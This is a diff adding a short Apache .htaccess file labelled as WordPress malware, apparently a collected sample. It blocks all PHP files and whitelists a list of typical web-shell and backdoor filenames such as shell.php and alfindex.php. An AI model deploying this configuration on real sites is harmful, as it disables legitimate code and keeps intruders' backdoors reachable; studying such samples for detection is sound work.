@@ -1,0 +1,10 @@
+# CMSmap WordPress malware 
+
+<FilesMatch ".*\.(?i:phtml|php|suspected)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
+<FilesMatch "(^([\.])index.php|^content-index.php|^class-wp-rest-controller-index.php|^backup_index.php|^db-cache.php|^db-safe-mode.php|^class-walker-nav-menu-check-index.php|^webindex.php|^adminindex.php|^wp-type.php|^wp-blog.php|^wp-red.php|^qindex.php|^wp-book.php|^alfindex.php|^oldindex.php|^k.php|^alfindex.php|^session-index.php|^wp-class-smtp-index.php|^wp-old-index.php|^oldindex.php|^plugin-install.php|^wpcss.php|^log.txt|^config.bak.php|^wpconfig.bak.php|^wp-1ogin_bak.php|^1ndex.php|^wp-booking.php|^shell.php|^css.php)$">
+Order Allow,Deny
+Allow from all
+</FilesMatch>
